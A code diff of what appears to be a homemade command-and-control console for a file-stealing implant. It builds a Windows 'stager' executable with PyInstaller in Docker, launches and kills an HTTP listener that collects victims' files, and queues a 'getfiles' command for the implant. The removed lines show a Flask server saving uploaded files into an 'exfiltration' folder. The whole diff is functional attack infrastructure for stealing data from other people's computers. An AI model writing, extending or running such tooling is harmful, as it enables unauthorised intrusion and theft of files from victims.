@@ -1,33 +1,11 @@
 import subprocess
-import  os
+import  os,signal
 import shutil
 import pdb
 import argparse
 from flask import Flask,request
 
 
-def run_flask():
-    app = Flask('app')
-
-    @app.route('/',methods = ['GET', 'POST'])
-    def run():
-        if request.method == 'GET':
-            return 'GET ME THOSE FILES I ASKED'
-        if request.method == 'POST':
-            # data = request.json
-            # import pdb
-            # pdb.set_trace()
-            if not os.path.exists('./exfiltration'):
-                os.mkdir('./exfiltration')
-            ## wb enables to write bianry
-            with open('./exfiltration/'+request.headers['Filename'], "wb") as f:
-                # Write bytes to file
-                f.write(request.data)
-            f.close()
-            return "OK"
-
-    
-    app.run(host = '0.0.0.0', port = 8080)
 
 def generate_stager():
     ## Convert to exe and save
@@ -35,7 +13,10 @@ def generate_stager():
         shutil.rmtree('./tmp')
 
     os.mkdir('./tmp')
-    subprocess.call(r"python -m PyInstaller --noconsole --onefile --name stager ../stager.py", cwd=r"./tmp")
+    subprocess.call('cp stager.spec tmp',shell=True)
+    subprocess.call('cp requirements.txt tmp',shell=True)
+    subprocess.call('cp stager.py tmp',shell=True)
+    subprocess.call('sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows', cwd=r"./tmp",shell=True)
 
 
 def parser():
@@ -45,24 +26,54 @@ def parser():
 	args = parser.parse_args()
 	return args
 
+def kill_listeners(flask_process):
+    os.killpg(os.getpgid(flask_process.pid), signal.SIGTERM)
+
 def main():
     args = parser()
     if args.generate:
         ## Import stager code and convert to exe
         generate_stager()
-    
+
     while True:
+        print("Enter command:")
         cmd = str(input())
         if cmd == 'http':
             ## Run a http listsener
-            run_flask()
+            ## see the process id 'ps -ef |grep nohup'
+            ## https://stackoverflow.com/questions/4789837/how-to-terminate-a-python-subprocess-launched-with-shell-true
+            flask_process = subprocess.Popen('sudo nohup python3 server.py > log.txt 2>&1 &',stdout=subprocess.PIPE, 
+                       shell=True, preexec_fn=os.setsid)
+            
+            # grep = subprocess.check_output('ps -ef | grep "nohup python3 server.py"',shell=True)
+            # grep = grep = grep.decode("utf-8")
+            # flask_pid = grep.split('\n')[0].split()[1]
+        if cmd == 'jobs':
+            if 'flask_process' in locals():
+                print("HTTP listener running ")
+            else:
+                print("No listener running")
+        if cmd == 'kill':
+            if 'flask_process' in locals():
+                kill_listeners(flask_process)
+                print("killed http listener")
+            else:
+                print("No listener running")
+        if cmd == 'generate':
+            generate_stager()
+            print("exe dumped to ./tmp")
         if cmd == 'getfiles':
-            pass
+            f = open('commands.txt','w+')
+            print('getfiles',file=f)
+            f.close()
         if cmd == 'exit':
+            kill_listeners(flask_process)
             break
-    
 
     
 
 if __name__=="__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        kill_listeners(flask_process)
